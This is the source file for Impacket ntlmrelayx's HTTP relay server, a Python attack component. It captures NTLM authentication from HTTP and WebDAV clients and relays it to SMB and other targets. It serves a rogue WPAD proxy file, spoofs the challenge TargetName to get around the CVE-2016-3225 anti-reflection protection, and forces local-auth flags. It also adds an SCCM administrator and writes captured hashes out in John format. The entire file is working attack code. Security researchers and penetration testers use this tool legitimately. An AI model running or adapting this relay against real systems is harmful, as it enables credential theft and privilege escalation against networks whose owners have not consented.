# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   HTTP Relay Server
#
#   This is the HTTP server which relays the NTLMSSP  messages to other protocols
#
# Authors:
#   Alberto Solino (@agsolino)
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#

import http.server
import socketserver
import socket
import base64
import random
import struct
import string
from threading import Thread
from six import PY2, b

from impacket import ntlm, LOG
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.utils import get_address

class HTTPRelayServer(Thread):

    class HTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        def __init__(self, server_address, RequestHandlerClass, config):
            self.config = config
            self.daemon_threads = True
            self.address_family, server_address = get_address(server_address[0], server_address[1], self.config.ipv6)
            # Tracks the number of times authentication was prompted for WPAD per client
            self.wpad_counters = {}
            socketserver.TCPServer.allow_reuse_address = True
            socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)

    class HTTPHandler(http.server.SimpleHTTPRequestHandler):
        def __init__(self,request, client_address, server):
            self.server = server
            self.protocol_version = 'HTTP/1.1'
            self.challengeMessage = None
            self.target = None
            self.client = None
            self.machineAccount = None
            self.machineHashes = None
            self.domainIp = None
            self.authUser = None
            self.relayToHost = False
            self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||' \
                        '(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; ' \
                        'return "PROXY %s:80; DIRECT";} '
            if self.server.config.mode != 'REDIRECT':
                if self.server.config.target is None:
                    # Reflection mode, defaults to SMB at the target, for now
                    self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
            try:
                http.server.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
            except Exception as e:
                LOG.debug("(HTTP): Exception:", exc_info=True)
                LOG.error("(HTTP): %s" % str(e))

        def handle_one_request(self):
            try:
                http.server.SimpleHTTPRequestHandler.handle_one_request(self)
            except KeyboardInterrupt:
                raise
            except Exception as e:
                LOG.debug("(HTTP): Exception:", exc_info=True)
                LOG.error('(HTTP): Exception in HTTP request handler: %s' % e)

        def log_message(self, format, *args):
            return

        def send_error(self, code, message=None):
            if message.find('RPC_OUT') >=0 or message.find('RPC_IN'):
                return self.do_GET()
            return http.server.SimpleHTTPRequestHandler.send_error(self,code,message)

        def send_not_found(self):
            self.send_response(404)
            self.send_header('WWW-Authenticate', 'NTLM')
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', '0')
            self.send_header('Connection', 'close')
            self.end_headers()

        def send_multi_status(self, content):
            self.send_response(207, "Multi-Status")
            self.send_header('Content-Type', 'application/xml')
            self.send_header('Content-Length', str(len(content)))
            self.send_header('Connection', 'close')
            self.end_headers()
            self.wfile.write(content)

        def serve_wpad(self):
            wpadResponse = self.wpad % (self.server.config.wpad_host, self.server.config.wpad_host)
            self.send_response(200)
            self.send_header('Content-type', 'application/x-ns-proxy-autoconfig')
            self.send_header('Content-Length',len(wpadResponse))
            self.end_headers()
            self.wfile.write(b(wpadResponse))
            return

        def should_serve_wpad(self, client):
            # If the client was already prompted for authentication, see how many times this happened
            try:
                num = self.server.wpad_counters[client]
            except KeyError:
                num = 0
            self.server.wpad_counters[client] = num + 1
            # Serve WPAD if we passed the authentication offer threshold
            if num >= self.server.config.wpad_auth_num:
                return True
            else:
                return False

        def serve_image(self):
            with open(self.server.config.serve_image, 'rb') as imgFile:
                imgFile_data = imgFile.read()
                self.send_response(200, "OK")
                self.send_header('Content-type', 'image/jpeg')
                self.send_header('Content-Length', str(len(imgFile_data)))
                self.end_headers()
                self.wfile.write(imgFile_data)

        def strip_blob(self, proxy):
            if PY2:
                if proxy:
                    proxyAuthHeader = self.headers.getheader('Proxy-Authorization')
                else:
                    autorizationHeader = self.headers.getheader('Authorization')
            else:
                if proxy:
                    proxyAuthHeader = self.headers.get('Proxy-Authorization')
                else:
                    autorizationHeader = self.headers.get('Authorization')

            if (proxy and proxyAuthHeader is None) or (not proxy and autorizationHeader is None):
                self.do_AUTHHEAD(message = b'NTLM',proxy=proxy)
                messageType = 0
                token = None
            else:
                if proxy:
                    typeX = proxyAuthHeader
                else:
                    typeX = autorizationHeader
                try:
                    _, blob = typeX.split('NTLM')
                    token = base64.b64decode(blob.strip())
                except Exception:
                    LOG.debug("(HTTP): Exception:", exc_info=True)
                    self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
                else:
                    messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            return token, messageType

        def do_HEAD(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

        def do_OPTIONS(self):
            self.send_response(200)
            self.send_header('Allow',
                             'GET, HEAD, POST, PUT, DELETE, OPTIONS, PROPFIND, PROPPATCH, MKCOL, LOCK, UNLOCK, MOVE, COPY')
            self.send_header('Content-Length', '0')
            self.send_header('Connection', 'close')
            self.end_headers()
            return

        def do_PROPFIND(self):

            LOG.info('(HTTP): Client requested path: %s' % self.path.lower())

            proxy = False
            if (".jpg" in self.path) or (".JPG" in self.path):
                content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/image.JPG/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>4456</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>4ebabfcee4364434dacb043986abfffe</D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
            else:
                content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""

            token, messageType = self.strip_blob(proxy)

            host_header = self.headers.get('Host', 'N/A')
            LOG.info('(HTTP): PROPFIND Host=%s, relayToHost=%s, disableMulti=%s, isADMINAttack=%s, messageType=%s' %
                    (host_header, self.relayToHost, self.server.config.disableMulti, self.server.config.isADMINAttack, messageType))

            # Should we relay or log-in locally?
            if self.relayToHost is False and not self.server.config.disableMulti:
                LOG.info('(HTTP): Taking do_local_auth path')
                self.do_local_auth(messageType, token, proxy)
                return
            else:
                # We can start the relay process
                LOG.info('(HTTP): Taking do_relay path')
                self.do_relay(messageType, token, proxy, content)

        def do_AUTHHEAD(self, message = b'', proxy=False):
            if proxy:
                self.send_response(407)
                self.send_header('Proxy-Authenticate', message.decode('utf-8'))
            else:
                self.send_response(401)
                self.send_header('WWW-Authenticate', message.decode('utf-8'))
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length','0')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        #Trickery to relay the victim to all the targets we want
        def do_REDIRECT(self, proxy=False):
            rstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
            self.send_response(307)
            if proxy:
                self.send_header('Proxy-Authenticate', 'NTLM')
            else:
                self.send_header('WWW-Authenticate', 'NTLM')
            self.send_header('Content-type', 'text/html')
            self.send_header('Connection','keep-alive')
            self.send_header('Location','/%s' % rstr)
            self.send_header('Content-Length','0')
            self.end_headers()

        def do_SMBREDIRECT(self):
            self.send_response(302)
            self.send_header('Content-type', 'text/html')
            self.send_header('Location','file://%s' % self.server.config.redirecthost)
            self.send_header('Content-Length','0')
            self.send_header('Connection','close')
            self.end_headers()

        def do_POST(self):
            return self.do_GET()

        def do_CONNECT(self):
            # Client is using our server as a Proxy
            proxy = True
            token, messageType = self.strip_blob(proxy)

            # We can't do the multirelay trick so we just relay the connection
            self.do_relay(messageType, token, proxy)
            return

        def do_GET(self):
            if self.server.config.mode == 'REDIRECT':
                self.do_SMBREDIRECT()
                return

            host_header = self.headers.get('Host', 'N/A')
            LOG.info('(HTTP): GET request - Host=%s, Path=%s' % (host_header, self.path.lower()))

            # Serve WPAD if:
            # - The client requests it
            # - A WPAD host was provided in the command line options
            # - The client has not exceeded the wpad_auth_num threshold yet
            if self.path.lower() == '/wpad.dat' and self.server.config.serve_wpad and self.should_serve_wpad(self.client_address[0]):
                LOG.info('(HTTP): Serving PAC file to client %s' % self.client_address[0])
                self.serve_wpad()
                return

            # Determine if the user is connecting to our server directly or attempts to use it as a proxy
            if len(self.path) > 4 and self.path[:4].lower() == 'http':
                proxy = True
            else:
                proxy = False

            token, messageType = self.strip_blob(proxy)

            # Should we relay or log-in locally?
            if self.relayToHost is False and not self.server.config.disableMulti:
                self.do_local_auth(messageType, token, proxy)
                return
            else:
                # We can start the relay process
                self.do_relay(messageType, token, proxy)

            return

        def do_ntlm_negotiate(self, token, proxy):
            if self.target.scheme.upper() in self.server.config.protocolClients:
                self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target)
                # If connection failed, return
                if not self.client.initConnection():
                    return False
                self.challengeMessage = self.client.sendNegotiate(token)

                # Spoof TargetName to bypass CVE-2016-3225 (SMB anti-reflection)
                if self.server.config.spoof_target_name:
                    LOG.info('(HTTP): Spoofing TargetName in NTLM challenge to: %s' % self.server.config.spoof_target_name)
                    # Save original domain_name length to calculate offset adjustment
                    original_domain_len = len(self.challengeMessage['domain_name'])
                    # Set TargetName (domain_name field) to the spoofed SPN
                    self.challengeMessage['domain_name'] = self.server.config.spoof_target_name.encode('utf-16le')
                    self.challengeMessage['domain_len'] = len(self.challengeMessage['domain_name'])
                    self.challengeMessage['domain_max_len'] = len(self.challengeMessage['domain_name'])
                    # Adjust TargetInfoFields offset based on the change in domain_name length
                    offset_adjustment = len(self.challengeMessage['domain_name']) - original_domain_len
                    self.challengeMessage['TargetInfoFields_offset'] += offset_adjustment
                    LOG.info('(HTTP): Adjusted TargetInfoFields_offset by %d bytes (new offset: %d)' % (offset_adjustment, self.challengeMessage['TargetInfoFields_offset']))

                # Remove target NetBIOS field from the NTLMSSP_CHALLENGE
                if self.server.config.remove_target:
                    av_pairs = ntlm.AV_PAIRS(self.challengeMessage['TargetInfoFields'])
                    del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
                    self.challengeMessage['TargetInfoFields'] = av_pairs.getData()
                    self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
                    self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())

                # When --try-local is enabled, modify Type 2 to trigger local auth
                if self.server.config.try_local:
                    LOG.info("(HTTP): --try-local enabled in relay mode, setting NEGOTIATE_LOCAL_CALL flag")
                    # Set the NEGOTIATE_LOCAL_CALL flag (0x00004000)
                    NTLMSSP_NEGOTIATE_LOCAL_CALL = 0x00004000
                    self.challengeMessage['flags'] |= NTLMSSP_NEGOTIATE_LOCAL_CALL
                    # Set a fake context handle in the Context field
                    # The client validates this, so we need something that looks valid
                    # For local auth, we use a non-zero value
                    self.challengeMessage['context'] = b'\x01\x02\x03\x04\x05\x06\x07\x08'
                    LOG.info("(HTTP): Set NEGOTIATE_LOCAL_CALL flag and context handle for local auth bypass")

                # Check for errors
                if self.challengeMessage is False:
                    return False
            else:
                LOG.error('(HTTP): Protocol Client for %s not found!' % self.target.scheme.upper())
                return False

            # Calculate auth
            self.do_AUTHHEAD(message = b'NTLM '+base64.b64encode(self.challengeMessage.getData()), proxy=proxy)
            return True

        def do_ntlm_auth(self,token,authenticateMessage):
            LOG.info("(HTTP): do_ntlm_auth - user_name='%s', target=%s" % (authenticateMessage['user_name'], self.target.hostname))
            if authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
                LOG.info("(HTTP): Calling client.sendAuth with token")
                clientResponse, errorCode = self.client.sendAuth(token)
                LOG.info("(HTTP): sendAuth returned errorCode: 0x%x" % errorCode)
            else:
                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
                # when coming from localhost
                LOG.info("(HTTP): Anonymous login detected, returning STATUS_ACCESS_DENIED")
                errorCode = STATUS_ACCESS_DENIED

            if errorCode == STATUS_SUCCESS:
                LOG.info("(HTTP): Auth succeeded!")
                return True

            LOG.info("(HTTP): Auth failed with errorCode: 0x%x" % errorCode)
            return False

        def do_local_auth(self, messageType, token, proxy):
            LOG.info("(HTTP): do_local_auth called, messageType=%s, isADMINAttack=%s" % (messageType, self.server.config.isADMINAttack))
            if messageType == 1:
                negotiateMessage = ntlm.NTLMAuthNegotiate()
                negotiateMessage.fromString(token)
                LOG.info("(HTTP): Type 1 NEGOTIATE received with flags: %s" % hex(negotiateMessage['flags']))
                ansFlags = 0

                if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_56:
                    ansFlags |= ntlm.NTLMSSP_NEGOTIATE_56
                if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_128:
                    ansFlags |= ntlm.NTLMSSP_NEGOTIATE_128
                if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH:
                    ansFlags |= ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH
                if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
                    ansFlags |= ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
                if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_SIGN:
                    ansFlags |= ntlm.NTLMSSP_NEGOTIATE_SIGN
                if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                    ansFlags |= ntlm.NTLMSSP_NEGOTIATE_UNICODE
                if negotiateMessage['flags'] & ntlm.NTLM_NEGOTIATE_OEM:
                    ansFlags |= ntlm.NTLM_NEGOTIATE_OEM

                ansFlags |= ntlm.NTLMSSP_NEGOTIATE_VERSION | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO | \
                            ntlm.NTLMSSP_TARGET_TYPE_SERVER | ntlm.NTLMSSP_NEGOTIATE_NTLM

                challengeMessage = ntlm.NTLMAuthChallenge()
                challengeMessage['flags'] = ansFlags
                LOG.info("(HTTP): Type 2 CHALLENGE sending with flags: %s" % hex(ansFlags))

                # When --try-local is enabled, construct proper Type 2 challenge to trigger HTTP local auth
                if self.server.config.try_local:
                    LOG.info("(HTTP): --try-local enabled, constructing proper Type 2 challenge for local auth")
                    # Set proper TargetName (server name)
                    challengeMessage['domain_name'] = 'WEBDAV-SERVER'
                    # Construct proper AV_PAIRS with NetBIOS computer name and domain name
                    av_pairs = ntlm.AV_PAIRS()
                    av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = 'WEBDAV-SERVER'.encode('utf-16le')
                    av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = 'WORKGROUP'.encode('utf-16le')
                    challengeMessage['TargetInfoFields'] = av_pairs
                    challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
                    challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())
                else:
                    challengeMessage['domain_name'] = ""
                    challengeMessage['TargetInfoFields'] = ntlm.AV_PAIRS()
                    challengeMessage['TargetInfoFields_len'] = 0
                    challengeMessage['TargetInfoFields_max_len'] = 0

                challengeMessage['challenge'] = ''.join(random.choice(string.printable) for _ in range(64))
                challengeMessage['TargetInfoFields_offset'] = 40 + 16
                challengeMessage['Version'] = b'\xff' * 8
                challengeMessage['VersionLen'] = 8

                self.do_AUTHHEAD(message=b'NTLM ' + base64.b64encode(challengeMessage.getData()),proxy=proxy)
                return

            elif messageType == 3:
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)
                self.authUser = authenticateMessage.getUserString()

                # AdminService attack: skip redirect, attack immediately
                if self.server.config.isADMINAttack:
                    LOG.info("Exiting standard auth flow to add SCCM admin...")

                    # Log what we received from the client (HTTP)
                    LOG.info("=== Received Type 3 AUTHENTICATE from Client ===")
                    LOG.info("Source: HTTP client %s" % self.client_address[0])
                    LOG.info("Authorization header: %s" % self.headers.get('Authorization', '(missing)'))
                    LOG.info("User-Agent: %s" % self.headers.get('User-Agent', '(none)'))
                    LOG.info("Domain: %s" % authenticateMessage['domain_name'])
                    LOG.info("Username: %s" % authenticateMessage['user_name'])
                    LOG.info("Workstation: %s" % authenticateMessage['host_name'])
                    LOG.info("NTLM Flags: 0x%08x" % authenticateMessage['flags'])

                    # Check if this is local auth (empty credentials)
                    if authenticateMessage['domain_name'] == '' and authenticateMessage['user_name'] == '':
                        LOG.info("** This is LOCAL AUTH (empty domain/username) **")
                        LOG.info("** Client is authenticating as its machine account **")

                    LOG.info("=== End Client Type 3 ===")

                    self.server.config.setSCCMAdminToken(token)
                    self.client.setClientId()

                    # Get target for attack
                    self.target = self.server.config.target.getTarget(identity=self.authUser)
                    if self.target is None:
                        LOG.error("No target available for AdminService attack")
                        self.send_not_found()
                        return

                    LOG.info("Authenticating against %s://%s as %s" % (self.target.scheme, self.target.netloc, self.authUser))
                    self.do_attack()

                    # Send a response to keep the client happy and prevent hanging
                    # For PROPFIND, send 207 Multi-Status; otherwise send 200 OK
                    if self.command == "PROPFIND":
                        content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
                        self.send_multi_status(content)
                    else:
                        # Send 200 OK for other requests
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.send_header('Content-Length', '0')
                        self.send_header('Connection', 'close')
                        self.end_headers()
                    return

                self.target = self.server.config.target.getTarget(identity = self.authUser)
                if self.target is None:
                    if self.server.config.keepRelaying:
                        self.server.config.target.reloadTargets(full_reload=True)
                        self.target = self.server.config.target.getTarget(identity=self.authUser)
                    else:
                        LOG.info("(HTTP): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
                        self.send_not_found()
                        return

                LOG.info("(HTTP): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))

                self.relayToHost = True
                self.do_REDIRECT()

        def do_relay(self, messageType, token, proxy, content = None):
            LOG.info("(HTTP): do_relay called with messageType=%d from %s" % (messageType, self.client_address[0]))
            if messageType == 1:
                if self.server.config.disableMulti:
                    self.target = self.server.config.target.getTarget(multiRelay=False)
                    if self.target is None:
                        if self.server.config.keepRelaying:
                            self.server.config.target.reloadTargets(full_reload=True)
                            self.target = self.server.config.target.getTarget(multiRelay=False)
                        else:
                            LOG.info("(HTTP): Connection from %s controlled, but there are no more targets left!" % self.client_address[0])
                            self.send_not_found()
                            return

                    LOG.info("(HTTP): Connection from %s controlled, attacking target %s://%s" % (self.client_address[0], self.target.scheme, self.target.netloc))

                try:
                    ntlm_negotiate_response = self.do_ntlm_negotiate(token, proxy=proxy)
                except Exception as e:
                    LOG.error('(HTTP): Exception while Negotiating NTLM with %s://%s: "%s"' % (self.target.scheme, self.target.netloc, str(e)))
                    ntlm_negotiate_response = False

                if not ntlm_negotiate_response:
                    # Connection failed
                    if self.server.config.disableMulti:
                        LOG.error('(HTTP): Negotiating NTLM with %s://%s failed' % (self.target.scheme, self.target.netloc))
                        self.server.config.target.registerTarget(self.target)
                        self.send_not_found()
                        return
                    else:
                        LOG.error('(HTTP): Negotiating NTLM with %s://%s failed. Skipping to next target' % (self.target.scheme, self.target.netloc))

                        self.server.config.target.registerTarget(self.target, gotUsername=self.authUser)
                        self.target = self.server.config.target.getTarget(identity=self.authUser)

                        if self.target is None:
                            if self.server.config.keepRelaying:
                                self.server.config.target.reloadTargets(full_reload=True)
                                self.target = self.server.config.target.getTarget(identity=self.authUser)
                            else:
                                LOG.info("(HTTP): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
                                self.send_not_found()
                                return

                        LOG.info("(HTTP): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))

                        self.do_REDIRECT()

            elif messageType == 3:
                LOG.info("(HTTP): Received AUTHENTICATE message from %s" % self.client_address[0])
                try:
                    authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                    authenticateMessage.fromString(token)
                    LOG.info("(HTTP): Parsed authenticate message, user: %s, flags: %s" % (authenticateMessage['user_name'], hex(authenticateMessage['flags'])))
                except Exception as e:
                    LOG.error("(HTTP): Exception parsing AUTHENTICATE message: %s" % str(e))
                    LOG.debug("(HTTP): Exception details:", exc_info=True)
                    self.send_not_found()
                    return

                if self.server.config.disableMulti:
                    self.authUser = authenticateMessage.getUserString()
                    target = '%s://%s@%s' % (self.target.scheme, self.authUser.replace("/", '\\'), self.target.netloc)

                # when relaying to the SCCM AdminService to add a new administrator,
                # we need to break out of the normal relay auth flow and
                # perform the attack all in one shot
                if self.server.config.isADMINAttack:
                    LOG.info("Exiting standard auth flow to add SCCM admin...")

                    # Log what we received from the client (HTTP)
                    LOG.info("=== Received Type 3 AUTHENTICATE from Client ===")
                    LOG.info("Source: HTTP client %s" % self.client_address[0])
                    LOG.info("Authorization header: %s" % self.headers.get('Authorization', '(missing)'))
                    LOG.info("User-Agent: %s" % self.headers.get('User-Agent', '(none)'))
                    LOG.info("Domain: %s" % authenticateMessage['domain_name'])
                    LOG.info("Username: %s" % authenticateMessage['user_name'])
                    LOG.info("Workstation: %s" % authenticateMessage['host_name'])
                    LOG.info("NTLM Flags: 0x%08x" % authenticateMessage['flags'])

                    # Check if this is local auth (empty credentials)
                    if authenticateMessage['domain_name'] == '' and authenticateMessage['user_name'] == '':
                        LOG.info("** This is LOCAL AUTH (empty domain/username) **")
                        LOG.info("** Client is authenticating as its machine account **")

                    LOG.info("=== End Client Type 3 ===")

                    self.server.config.setSCCMAdminToken(token)
                    self.client.setClientId()
                    LOG.info("Authenticating against %s://%s as %s" % (self.target.scheme, self.target.netloc, self.authUser))
                    self.do_attack()

                    # Send a response to keep the client happy and prevent hanging
                    # For PROPFIND, send 207 Multi-Status; otherwise send 200 OK
                    if self.command == "PROPFIND":
                        propfind_content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
                        self.send_multi_status(propfind_content)
                    else:
                        # Send 200 OK for other requests
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.send_header('Content-Length', '0')
                        self.send_header('Connection', 'close')
                        self.end_headers()
                    return

                LOG.info("(HTTP): Calling do_ntlm_auth for %s" % self.authUser)
                if not self.do_ntlm_auth(token, authenticateMessage):
                    LOG.error("(HTTP): Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc, self.authUser))
                    if self.server.config.disableMulti:
                        self.send_not_found()
                        return
                    # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
                    # which we don't want
                    if authenticateMessage['user_name'] != '':  # and authenticateMessage['user_name'][-1] != '$':
                        self.server.config.target.registerTarget(self.target, gotUsername=self.authUser)
                        # No anonymous login, go to next host and avoid triggering a popup
                        self.target = self.server.config.target.getTarget(identity=self.authUser)
                        if self.target is None:

                            if self.server.config.keepRelaying:
                                self.server.config.target.reloadTargets(full_reload=True)
                                self.target = self.server.config.target.getTarget(identity=self.authUser)
                            else:
                                LOG.info("(HTTP): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
                                self.send_not_found()
                                return

                        self.send_not_found()  # Stop relaying at first login fail, this matches the behavior of smbrelayserver

                        # Uncomment lines below to keep relaying after login failures
                        # LOG.info("(HTTP): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))

                        # self.do_REDIRECT()
                    else:
                        # If it was an anonymous login, send 401
                        self.do_AUTHHEAD(b'NTLM', proxy=proxy)
                else:
                    # Relay worked, do whatever we want here...
                    self.client.setClientId()
                    LOG.info("(HTTP): Authenticating connection from %s@%s against %s://%s SUCCEED [%s]" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))

                    ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                    self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                    if self.server.config.dumpHashes is True:
                        LOG.info("(HTTP): %s" % ntlm_hash_data['hash_string'])

                    if self.server.config.outputFile is not None:
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              self.server.config.outputFile)

                    if not self.server.config.isADCSAttack:
                        self.server.config.target.registerTarget(self.target, True, self.authUser)

                    self.do_attack()
                    if self.server.config.disableMulti:
                        # We won't use the redirect trick, closing connection...
                        if self.command == "PROPFIND":
                            self.send_multi_status(content)
                        else:
                            self.send_not_found()
                        return
                    else:
                        # Let's grab our next target
                        self.target = self.server.config.target.getTarget(identity=self.authUser)

                        if self.target is None:
                            if self.server.config.keepRelaying:
                                self.server.config.target.reloadTargets(full_reload=True)
                                self.target = self.server.config.target.getTarget(identity=self.authUser)
                            else:
                                LOG.info("(HTTP): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
                                # Return Multi-Status status code to WebDAV servers
                                if self.command == "PROPFIND":
                                    self.send_multi_status(content)
                                    return

                                # Serve image and return 200 if --serve-image option has been set by user
                                if (self.server.config.serve_image):
                                    self.serve_image()
                                    return

                                # And answer 404 not found
                                self.send_not_found()
                                return

                        # We have the next target, let's keep relaying...
                        LOG.info("(HTTP): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
                        self.do_REDIRECT()

        def do_attack(self):
            # Check if SOCKS is enabled and if we support the target scheme
            if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
                # Pass all the data to the socksplugins proxy
                activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(),
                                       self.authUser, self.client, self.client.sessionData))
                return

            # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
            if self.target.scheme.upper() in self.server.config.attacks:
                # We have an attack.. go for it
                clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,
                                                                               self.authUser, self.target, self.client)
                clientThread.start()
            else:
                LOG.error('(HTTP): No attack configured for %s' % self.target.scheme.upper())

    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None
        self.httpport = None

    def run(self):
        if not self.config.listeningPort:
            self.config.listeningPort = 80

        LOG.info("Setting up HTTP Server on port %s" % self.config.listeningPort)

        # changed to read from the interfaceIP set in the configuration
        self.server = self.HTTPServer((self.config.interfaceIp, self.config.listeningPort), self.HTTPHandler, self.config)

        try:
             self.server.serve_forever()
        except KeyboardInterrupt:
             pass
        LOG.info('Shutting down HTTP Server')
        self.server.server_close()
